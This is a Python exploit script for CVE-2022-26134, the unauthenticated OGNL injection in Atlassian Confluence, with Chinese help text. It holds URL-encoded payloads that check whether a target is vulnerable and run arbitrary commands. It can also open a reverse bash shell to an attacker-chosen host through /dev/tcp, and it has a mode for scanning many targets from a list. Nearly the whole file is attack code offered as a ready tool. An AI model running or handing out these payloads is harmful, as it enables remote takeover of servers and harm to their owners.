import requests
import argparse
import os
import urllib3
import sys

urllib3.disable_warnings()

# proxy = "127.0.0.1:33210"
# proxies={
#     'http':'http://'+proxy,
#     'https':'https://'+proxy
# }
os.environ["http_proxy"] = "http://127.0.0.1:33210"
os.environ["https_proxy"] = "http://127.0.0.1:33210"

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0'
}
def check(url):
    payload = '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
    url0 = url + payload
    try:
        resp = requests.get(url=url0,headers=headers,verify=False,allow_redirects=False)
        if "X-Cmd-Response" in resp.headers and resp.status_code==302:
            print('[√] '+url+' vul')
        else:
            print("[x] "+url+" not vul")
    except:
        print("connect failed.")


def exp(url,cmd):
    payload = '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22'+cmd+'%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'
    url = url + payload
    try:
        resp = requests.get(url=url,headers=headers,verify=False, allow_redirects=False)
        if "X-Cmd-Response" in resp.headers and resp.status_code == 302:
            print(resp.headers['X-Cmd-Response'])
        else:
            print("[x] not vul")
    except:
        print("connect failed.")

def getShell(url,lhost,lport):
    payload = "/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/"+lhost+"/"+lport+"%200%3E%261%27%29.start%28%29%22%29%7D/"
    url = url + payload
    print(url)
    try:
        resp = requests.get(url=url,headers=headers,verify=False, allow_redirects=False)
        print(resp.headers)
        if resp.status_code == 302:
            print("check your shell")
        else:
            print("not vul")
    except:
        print("connect failed.")

def batch(file):
    for url_link in open(file, 'r', encoding='utf-8'):
        if url_link.strip() != '':
            url_path = format_url(url_link.strip())
            check(url_path)

def format_url(url):
    try:
        if url[:4] != "http":
            url = "https://" + url
            url = url.strip()
        return url
    except Exception as e:
        print('URL 错误 {0}'.format(url))

if __name__ == '__main__':
    print('-'*70)
    print("Atlassian Confluence 未经身份验证的远程 OGNL 注入漏洞（CVE-2022-26134）\n\n\t\t\t\t\t\t ---LUCKYZ")
    print('-' * 70)
    parser = argparse.ArgumentParser(description="CVE-2022-26134 confluence RCE --by luckyZ",
                                     usage="\n    单一目标检测：python3 exp.py -u https://www.evil.com/ --check\n"
                                           "    单一目标命令执行：python3 exp.py -u https://www.evil.com/ -c 'whoami'\n"
                                           "    单一目标反弹shell：python3 exp.py -u http://www.evil.com/ -lh 1.1.1.1 -lp 4444\n"
                                           "    批量检测：python3 exp.py -f url.txt --check")

    parser.add_argument('-u',action="store",dest="url",help="目标url")
    parser.add_argument('--check', action="store_true", dest='check', help="目标只检测不返回结果")
    parser.add_argument('-c',action="store",dest="command",help="需要执行的命令")
    # parser.add_argument('-dns', action="store", dest="dnsUrl", help="dnslog地址")
    parser.add_argument('-lh', action="store", dest="lhost", help="本地回连ip")
    parser.add_argument('-lp', action="store", dest="lport", type=int, help="本地回连端口（默认端口4444）", default="4444")
    parser.add_argument('-f', action="store", dest='file', help='批量检测')
    args = parser.parse_args()

    if args.check == True and args.file is None:
        url = args.url
        check(url)
        sys.exit(0)

    elif args.check == True and args.file != "":
        batch(args.file)
        sys.exit(0)

    elif args.check == False and args.lhost is None:
        url = args.url
        cmd = args.command
        exp(url,cmd)
        sys.exit(0)

    elif args.check == False and args.lhost != "" and args.lport != "":
        url = args.url
        lhost = args.lhost
        lport = str(args.lport)
        getShell(url,lhost,lport)
        sys.exit(0)

    else:
        print("please input '--help' for instructions")


